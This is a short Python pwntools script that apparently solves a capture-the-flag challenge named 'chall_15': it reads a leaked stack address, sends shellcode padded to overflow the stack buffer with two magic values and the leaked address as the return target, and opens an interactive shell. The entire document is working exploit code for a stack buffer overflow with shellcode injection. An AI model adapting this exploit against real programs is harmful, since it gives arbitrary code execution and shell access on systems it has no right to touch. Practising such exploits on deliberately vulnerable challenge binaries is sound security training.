from pwn import *
elf=ELF("./chall_15")
context.arch="amd64"
shellcode = asm(shellcraft.sh())
p=process("./chall_15")
p.recvuntil(b'\n')
leak = p.recv()
stackleak = int(leak,16)
payload = shellcode+b's'*232+p32(0xdeadd00d)+p32(0xb16b00b5)+b's'*8+p64(stackleak)
p.sendline(payload)
p.interactive()
